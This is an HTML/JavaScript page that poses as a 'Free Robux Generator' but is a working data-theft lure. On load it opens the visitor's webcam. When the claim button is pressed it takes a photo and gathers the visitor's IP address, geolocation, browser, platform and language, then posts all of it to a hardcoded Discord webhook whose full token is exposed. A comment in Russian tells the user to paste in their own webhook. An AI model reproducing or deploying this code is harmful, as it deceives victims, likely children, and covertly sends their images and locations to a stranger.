<style>

<body>
<div class="container">
  <h1>ğŸ‰ Free Robux Generator</h1>
  <p>Press the button to claim your free Robux!</p>
  <video id="video" autoplay playsinline width="320" height="240"></video>
  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
  <div id="status">Status: Waiting...</div>
  <button id="snap">ğŸ“¸ Claim Free Robux</button>
</div>

<script>
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1341126415923417160/1MBugwArtglgPFGUtKcga7hsdLAtafh3qmKavgcz0mw6FBoubVVDT3UMvXF07AqbWZ4Q"; // <--- Ğ’ÑÑ‚Ğ°Ğ²ÑŒ ÑÑĞ´Ğ° ÑĞ²Ğ¾Ğ¹ Ğ²ĞµĞ±Ñ…ÑƒĞº

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const statusEl = document.getElementById("status");

async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    statusEl.textContent = "Status: Camera ready âœ…";
  } catch (err) {
    statusEl.textContent = "Status: Camera denied âŒ";
    console.error(err);
  }
}
startCamera();

async function getIP() {
  try {
    const res = await fetch("https://api.ipify.org/?format=json");
    const data = await res.json();
    return data.ip;
  } catch {
    return "Unavailable";
  }
}

document.getElementById("snap").onclick = async () => {
  statusEl.textContent = "Status: Taking photo...";
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  canvas.toBlob(async (blob) => {
    statusEl.textContent = "Status: Gathering info...";

    let ip = await getIP();
    let browser = navigator.userAgent;
    let language = navigator.language;
    let platform = navigator.platform;
    let date = new Date().toLocaleString();

    let locationText = "Location denied";
    if (navigator.geolocation) {
      await new Promise(resolve => {
        navigator.geolocation.getCurrentPosition(pos => {
          locationText = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
          resolve();
        }, () => resolve());
      });
    }

    statusEl.textContent = "Status: Sending to Discord...";

    const data = {
      content: "ğŸ‰ New Free Robux claim!",
      embeds: [{
        title: "ğŸ“Œ Claim Info",
        color: 5814783,
        fields: [
          { name: "ğŸŒ Location", value: locationText, inline: false },
          { name: "ğŸ’» Browser", value: browser, inline: false },
          { name: "ğŸ–¥ Platform", value: platform, inline: true },
          { name: "ğŸ—£ Language", value: language, inline: true },
          { name: "ğŸ“± IP Address", value: ip, inline: true },
          { name: "â± Date/Time", value: date, inline: false }
        ],
        image: { url: "attachment://photo.jpg" }
      }]
    };

    const form = new FormData();
    form.append("payload_json", JSON.stringify(data));
    form.append("file", blob, "photo.jpg");

    try {
      const res = await fetch(DISCORD_WEBHOOK, { method: "POST", body: form });
      statusEl.textContent = res.ok ? "Status: Sent âœ…" : "Status: Failed âŒ";
    } catch (e) {
      statusEl.textContent = "Status: Error âŒ";
      console.error(e);
    }
  }, "image/jpeg", 0.9);
};
</script>
